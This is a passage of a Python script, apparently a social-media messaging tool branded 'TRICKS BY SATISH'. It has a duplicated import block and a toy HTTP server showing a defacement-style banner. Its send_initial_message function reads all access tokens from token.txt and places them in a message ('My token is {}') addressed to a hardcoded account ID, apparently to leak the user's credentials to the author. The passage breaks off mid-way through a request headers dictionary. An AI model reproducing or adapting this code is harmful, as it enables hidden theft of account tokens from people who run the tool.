import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random
import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.send_header('Content-type', 'text/plain')
          self.end_headers()
          self.wfile.write(b"   7H3 UNST0B3L H4MZ4 FUC3D  INSID3")
def execute_server():
      PORT = int(os.environ.get('PORT', 4000))

      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
          print("Server running at http://localhost:{}".format(PORT))
          httpd.serve_forever()


def send_initial_message():
      with open('token.txt', 'r') as file:
          tokens = file.readlines()

      # Modify the message as per your requirement
      msg_template = "Hello Noddy legand  sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100030134016709"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•────────────────────── TRICKS BY SATISH ───────────────────────────────•')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Reque
